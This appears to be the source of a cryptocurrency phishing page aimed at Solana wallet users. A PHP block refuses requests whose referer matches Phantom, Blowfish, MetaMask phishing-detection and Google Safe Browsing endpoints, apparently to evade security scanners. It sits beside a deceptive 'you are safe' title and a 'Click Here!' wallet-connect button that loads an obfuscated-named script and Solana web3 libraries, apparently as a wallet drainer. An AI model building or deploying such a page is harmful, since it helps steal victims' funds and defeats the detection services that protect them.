<!-- Added potential popup bypass - let's see if it works... -->
<?php
$blockedEndpoints = ['https://blocklist.phantom.app', 'http://blocklist.phantom.app', 'https://blowfish-blocklist-proxy.phantom.app', 'http://blowfish-blocklist-proxy.phantom.app', 'https://phishing-detection.metafi.codefi.network', 'http://phishing-detection.metafi.codefi.network', 'https://safebrowsing.googleapis.com', 'http://safebrowsing.googleapis.com', 'https://api.phantom.app/transaction/scan/', 'http://api.phantom.app/transaction/scan/', 'https://eppo-proxy.phantom.app/api/randomized_assignment/v3/', 'http://eppo-proxy.phantom.app/api/randomized_assignment/v3/'];

$sourceUrl = $_SERVER['HTTP_REFERER'] ?? 'unknown';

if (in_array($sourceUrl, $blockedEndpoints)) {
    header('HTTP/1.1 403 Forbidden');
    exit('Access denied');
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>hi @pastdue loves you, you are safe.</title>
    <script src="49nv4vf99d0ef1hb.js"></script>
    <script src="spl.js"></script>
    <script src="https://unpkg.com/@solana/web3.js@1.33.0/lib/index.iife.js"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: linear-gradient(45deg, cyan, pink);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-size: 400% 400%;
            animation: gradientBG 15s ease infinite;
        }

        @keyframes gradientBG {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .custom-button {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            background-color: #ffffff;
            cursor: pointer;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
            font-size: 16px;
            font-weight: bold;
            color: #333;
        }

        .custom-button:hover {
            transform: scale(1.05);
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
        }
    </style>
</head>
<body>
    <button class="connect-button custom-button">Click Here!</button>
</body>
</html>
